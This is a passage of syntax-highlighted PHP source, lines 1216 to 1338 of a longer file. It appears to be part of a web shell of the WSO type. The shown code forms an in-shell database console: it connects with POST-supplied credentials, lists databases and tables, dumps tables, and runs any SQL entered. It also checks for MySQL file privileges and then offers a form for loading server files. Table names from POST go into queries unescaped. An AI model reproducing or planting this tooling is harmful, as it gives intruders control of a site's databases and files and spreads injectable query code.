<span class="lineno">1216</span> <span class="s2">&lt;td&gt;&lt;input type=text name=sql_login value=&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;root&#39;</span> <span class="o">:</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">]))</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&lt;/td&gt;</span>
<span class="lineno">1217</span> <span class="s2">&lt;td&gt;&lt;input type=text name=sql_pass value=&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;&#39;</span> <span class="o">:</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">]))</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1218</span>                                                                     <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">&quot;&lt;input type=text name=sql_base value=&#39;&#39;&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1219</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1220</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1221</span>                                                                             <span class="k">switch</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno">1222</span>                                                                                 <span class="k">case</span> <span class="s2">&quot;Windows-1251&quot;</span><span class="o">:</span>
<span class="lineno">1223</span>                                                                                     <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;cp1251&#39;</span><span class="p">);</span>
<span class="lineno">1224</span>                                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno">1225</span>                                                                                 <span class="k">case</span> <span class="s2">&quot;UTF-8&quot;</span><span class="o">:</span>
<span class="lineno">1226</span>                                                                                     <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">);</span>
<span class="lineno">1227</span>                                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno">1228</span>                                                                                 <span class="k">case</span> <span class="s2">&quot;KOI8-R&quot;</span><span class="o">:</span>
<span class="lineno">1229</span>                                                                                     <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8r&#39;</span><span class="p">);</span>
<span class="lineno">1230</span>                                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno">1231</span>                                                                                 <span class="k">case</span> <span class="s2">&quot;KOI8-U&quot;</span><span class="o">:</span>
<span class="lineno">1232</span>                                                                                     <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8u&#39;</span><span class="p">);</span>
<span class="lineno">1233</span>                                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno">1234</span>                                                                                 <span class="k">case</span> <span class="s2">&quot;cp866&quot;</span><span class="o">:</span>
<span class="lineno">1235</span>                                                                                     <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;cp866&#39;</span><span class="p">);</span>
<span class="lineno">1236</span>                                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno">1237</span>                                                                             <span class="p">}</span>
<span class="lineno">1238</span>                                                                             <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">listDbs</span><span class="p">();</span>
<span class="lineno">1239</span>                                                                             <span class="k">echo</span> <span class="s2">&quot;&lt;select name=sql_base&gt;&lt;option value=&#39;&#39;&gt;&lt;/option&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1240</span>                                                                             <span class="k">while</span> <span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">1241</span>                                                                                 <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno">1242</span>                                                                                 <span class="k">echo</span> <span class="s1">&#39;&lt;option value=&quot;&#39;</span> <span class="o">.</span> <span class="nv">$value</span> <span class="o">.</span> <span class="s1">&#39;&quot; &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="s1">&#39;selected&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$value</span> <span class="o">.</span> <span class="s1">&#39;&lt;/option&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1243</span>                                                                             <span class="p">}</span>
<span class="lineno">1244</span>                                                                             <span class="k">echo</span> <span class="s1">&#39;&lt;/select&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1245</span>                                                                         <span class="p">}</span> <span class="k">else</span> <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
<span class="lineno">1246</span>                                                                     <span class="p">}</span> <span class="k">else</span> <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
<span class="lineno">1247</span>                                                                     <span class="k">echo</span> <span class="s2">&quot;&lt;/td&gt;</span>
<span class="lineno">1248</span> <span class="s2">              &lt;td&gt;&lt;input type=submit value=&#39;&gt;&gt;&#39; onclick=&#39;fs(d.sf);&#39;&gt;&lt;/td&gt;</span>
<span class="lineno">1249</span> <span class="s2">                &lt;td&gt;&lt;input type=checkbox name=sql_count value=&#39;on&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_count&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;&#39;</span> <span class="o">:</span> <span class="s1">&#39; checked&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&gt; count the number of rows&lt;/td&gt;</span>
<span class="lineno">1250</span> <span class="s2">          &lt;/tr&gt;</span>
<span class="lineno">1251</span> <span class="s2">      &lt;/table&gt;</span>
<span class="lineno">1252</span> <span class="s2">      &lt;script&gt;</span>
<span class="lineno">1253</span> <span class="s2">            s_db=&#39;&quot;</span> <span class="o">.</span> <span class="o">@</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span>
<span class="lineno">1254</span> <span class="s2">            function fs(f) {</span>
<span class="lineno">1255</span> <span class="s2">                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};</span>
<span class="lineno">1256</span> <span class="s2">                    if(f.p1) f.p1.value=&#39;&#39;;</span>
<span class="lineno">1257</span> <span class="s2">                    if(f.p2) f.p2.value=&#39;&#39;;</span>
<span class="lineno">1258</span> <span class="s2">                    if(f.p3) f.p3.value=&#39;&#39;;</span>
<span class="lineno">1259</span> <span class="s2">                }</span>
<span class="lineno">1260</span> <span class="s2">            }</span>
<span class="lineno">1261</span> <span class="s2">          function st(t,l) {</span>
<span class="lineno">1262</span> <span class="s2">              d.sf.p1.value = &#39;select&#39;;</span>
<span class="lineno">1263</span> <span class="s2">              d.sf.p2.value = t;</span>
<span class="lineno">1264</span> <span class="s2">                if(l &amp;&amp; d.sf.p3) d.sf.p3.value = l;</span>
<span class="lineno">1265</span> <span class="s2">              d.sf.submit();</span>
<span class="lineno">1266</span> <span class="s2">          }</span>
<span class="lineno">1267</span> <span class="s2">          function is() {</span>
<span class="lineno">1268</span> <span class="s2">              for(i=0;i&lt;d.sf.elements[&#39;tbl[]&#39;].length;++i)</span>
<span class="lineno">1269</span> <span class="s2">                  d.sf.elements[&#39;tbl[]&#39;][i].checked = !d.sf.elements[&#39;tbl[]&#39;][i].checked;</span>
<span class="lineno">1270</span> <span class="s2">          }</span>
<span class="lineno">1271</span> <span class="s2">      &lt;/script&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1272</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1273</span>                                                                         <span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;&lt;table width=100% cellpadding=2 cellspacing=0&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1274</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1275</span>                                                                             <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
<span class="lineno">1276</span>                                                                             <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td width=1 style=&#39;border-top:2px solid #666;&#39;&gt;&lt;span&gt;Tables:&lt;/span&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1277</span>                                                                             <span class="nv">$tbls_res</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">listTables</span><span class="p">();</span>
<span class="lineno">1278</span>                                                                             <span class="k">while</span> <span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nv">$tbls_res</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1279</span>                                                                                 <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno">1280</span>                                                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_count&#39;</span><span class="p">]))</span> <span class="nv">$n</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span> <span class="o">.</span> <span class="nv">$value</span> <span class="o">.</span> <span class="s1">&#39;&#39;</span><span class="p">));</span>
<span class="lineno">1281</span>                                                                                 <span class="nv">$value</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
<span class="lineno">1282</span>                                                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;nobr&gt;&lt;input type=&#39;checkbox&#39; name=&#39;tbl[]&#39; value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$value</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&amp;nbsp;&lt;a href=# onclick=</span><span class="se">\&quot;</span><span class="s2">st(&#39;&quot;</span> <span class="o">.</span> <span class="nv">$value</span> <span class="o">.</span> <span class="s2">&quot;&#39;,1)</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span> <span class="o">.</span> <span class="nv">$value</span> <span class="o">.</span> <span class="s2">&quot;&lt;/a&gt;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_count&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;&amp;nbsp;&#39;</span> <span class="o">:</span> <span class="s2">&quot; &lt;small&gt;(</span><span class="si">{</span><span class="nv">$n</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">)&lt;/small&gt;&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;/nobr&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1283</span>                                                                             <span class="p">}</span>
<span class="lineno">1284</span>                                                                             <span class="k">echo</span> <span class="s2">&quot;&lt;input type=&#39;checkbox&#39; onclick=&#39;is();&#39;&gt; &lt;input type=button value=&#39;Dump&#39; onclick=&#39;document.sf.p2.value=</span><span class="se">\&quot;</span><span class="s2">download</span><span class="se">\&quot;</span><span class="s2">;document.sf.submit();&#39;&gt;&lt;br&gt;File path:&lt;input type=text name=file value=&#39;dump.sql&#39;&gt;&lt;/td&gt;&lt;td style=&#39;border-top:2px solid #666;&#39;&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1285</span>                                                                             <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;select&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1286</span>                                                                                 <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;query&#39;</span><span class="p">;</span>
<span class="lineno">1287</span>                                                                                 <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
<span class="lineno">1288</span>                                                                                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno">1289</span>                                                                                 <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
<span class="lineno">1290</span>                                                                                 <span class="nv">$pages</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$num</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">30</span><span class="p">);</span>
<span class="lineno">1291</span>                                                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;script&gt;d.sf.onsubmit=function(){st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, d.sf.p3.value)}&lt;/script&gt;&lt;span&gt;&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/span&gt; (</span><span class="si">{</span><span class="nv">$num</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> records) Page # &lt;input type=text name=&#39;p3&#39; value=&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1292</span>                                                                                 <span class="k">echo</span> <span class="s2">&quot; of </span><span class="si">$pages</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1293</span>                                                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot; &lt;a href=# onclick=&#39;st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&quot;, &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;)&#39;&gt;&lt; Prev&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1294</span>                                                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nv">$pages</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot; &lt;a href=# onclick=&#39;st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&quot;, &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;)&#39;&gt;Next &gt;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1295</span>                                                                                 <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">--</span><span class="p">;</span>
<span class="lineno">1296</span>                                                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;pgsql&#39;</span><span class="p">)</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM &#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39; LIMIT 30 OFFSET &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">30</span><span class="p">);</span>
<span class="lineno">1297</span>                                                                                 <span class="k">else</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM `&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;` LIMIT &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">30</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;,30&#39;</span><span class="p">;</span>
<span class="lineno">1298</span>                                                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1299</span>                                                                             <span class="p">}</span>
<span class="lineno">1300</span>                                                                             <span class="k">if</span> <span class="p">((</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;query&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1301</span>                                                                                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno">1302</span>                                                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1303</span>                                                                                     <span class="nv">$title</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1304</span>                                                                                     <span class="k">echo</span> <span class="s1">&#39;&lt;table width=100% cellspacing=1 cellpadding=2 class=main style=&quot;background-color:#292929&quot;&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1305</span>                                                                                     <span class="nv">$line</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="lineno">1306</span>                                                                                     <span class="k">while</span> <span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">1307</span>                                                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$title</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1308</span>                                                                                             <span class="k">echo</span> <span class="s1">&#39;&lt;tr&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1309</span>                                                                                             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="k">echo</span> <span class="s1">&#39;&lt;th&gt;&#39;</span> <span class="o">.</span> <span class="nv">$key</span> <span class="o">.</span> <span class="s1">&#39;&lt;/th&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1310</span>                                                                                             <span class="nb">reset</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno">1311</span>                                                                                             <span class="nv">$title</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">1312</span>                                                                                             <span class="k">echo</span> <span class="s1">&#39;&lt;/tr&gt;&lt;tr&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1313</span>                                                                                             <span class="nv">$line</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
<span class="lineno">1314</span>                                                                                         <span class="p">}</span>
<span class="lineno">1315</span>                                                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;tr class=&quot;l&#39;</span> <span class="o">.</span> <span class="nv">$line</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1316</span>                                                                                         <span class="nv">$line</span> <span class="o">=</span> <span class="nv">$line</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">?</span> <span class="mi">2</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
<span class="lineno">1317</span>                                                                                         <span class="k">foreach</span> <span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1318</span>                                                                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="k">null</span><span class="p">)</span> <span class="k">echo</span> <span class="s1">&#39;&lt;td&gt;&lt;i&gt;null&lt;/i&gt;&lt;/td&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1319</span>                                                                                             <span class="k">else</span> <span class="k">echo</span> <span class="s1">&#39;&lt;td&gt;&#39;</span> <span class="o">.</span> <span class="nb">nl2br</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1320</span>                                                                                         <span class="p">}</span>
<span class="lineno">1321</span>                                                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;/tr&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1322</span>                                                                                     <span class="p">}</span>
<span class="lineno">1323</span>                                                                                     <span class="k">echo</span> <span class="s1">&#39;&lt;/table&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1324</span>                                                                                 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1325</span>                                                                                     <span class="k">echo</span> <span class="s1">&#39;&lt;div&gt;&lt;b&gt;Error:&lt;/b&gt; &#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">())</span> <span class="o">.</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1326</span>                                                                                 <span class="p">}</span>
<span class="lineno">1327</span>                                                                             <span class="p">}</span>
<span class="lineno">1328</span>                                                                             <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;/form&gt;&lt;form onsubmit=&#39;d.sf.p1.value=</span><span class="se">\&quot;</span><span class="s2">query</span><span class="se">\&quot;</span><span class="s2">;d.sf.p2.value=this.query.value;document.sf.submit();return false;&#39;&gt;&lt;textarea name=&#39;query&#39; style=&#39;width:100%;height:100px&#39;&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1329</span>                                                                             <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;loadfile&#39;</span><span class="p">))</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno">1330</span>                                                                             <span class="k">echo</span> <span class="s2">&quot;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=submit value=&#39;Execute&#39;&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1331</span>                                                                             <span class="k">echo</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1332</span>                                                                         <span class="p">}</span>
<span class="lineno">1333</span>                                                                         <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&lt;/form&gt;&lt;br/&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1334</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mysql&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1335</span>                                                                             <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT 1 FROM mysql.user WHERE concat(`user`, &#39;@&#39;, `host`) = USER() AND `File_priv` = &#39;y&#39;&quot;</span><span class="p">);</span>
<span class="lineno">1336</span>                                                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="k">echo</span> <span class="s2">&quot;&lt;form onsubmit=&#39;d.sf.p1.value=</span><span class="se">\&quot;</span><span class="s2">loadfile</span><span class="se">\&quot;</span><span class="s2">;document.sf.p2.value=this.f.value;document.sf.submit();return false;&#39;&gt;&lt;span&gt;Load file&lt;/span&gt; &lt;input  class=&#39;toolsInp&#39; type=text name=f&gt;&lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;&lt;/form&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1337</span>                                                                         <span class="p">}</span>
<span class="lineno">1338</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;loadfile&#39;</span><span class="p">)</span> <span class="p">{</span>
